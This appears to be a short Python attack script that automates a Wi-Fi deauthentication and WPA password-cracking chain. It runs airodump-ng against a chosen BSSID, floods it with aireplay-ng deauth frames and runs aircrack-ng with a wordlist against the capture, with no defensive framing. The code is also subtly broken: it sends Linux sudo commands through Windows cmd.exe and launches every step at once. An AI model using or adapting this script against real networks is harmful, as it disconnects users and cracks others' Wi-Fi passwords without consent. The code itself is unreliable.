import subprocess

def start_deauth_attack():
    subprocess.Popen(
        ["cmd.exe", "/k", "sudo airmon-ng start wlan0mon && sudo airodump-ng wlan0mon"],
        creationflags=subprocess.CREATE_NEW_CONSOLE
    )
    target_bssid = input("Enter the target BSSID: ")
    channel = input("Enter the channel of the target network: ")
    subprocess.Popen(
        ["cmd.exe", "/k", "sudo airodump-ng -c" + channel + " -d " + target_bssid + " wlan0mon -w capture"],
        creationflags=subprocess.CREATE_NEW_CONSOLE
    )

    subprocess.Popen(
        ["cmd.exe", "/k", "sudo aireplay-ng --deauth 100 -a " + target_bssid + " wlan0mon"],
        creationflags=subprocess.CREATE_NEW_CONSOLE
    )

    subprocess.Popen(
        ["cmd.exe", "/k", "sudo airmon-ng stop wlan0mon"],
        creationflags=subprocess.CREATE_NEW_CONSOLE
    )

    subprocess.Popen(
        ["cmd.exe", "/k", "sudo aircrack-ng -w wordlist.txt capture-01.cap"],
        creationflags=subprocess.CREATE_NEW_CONSOLE
    )
    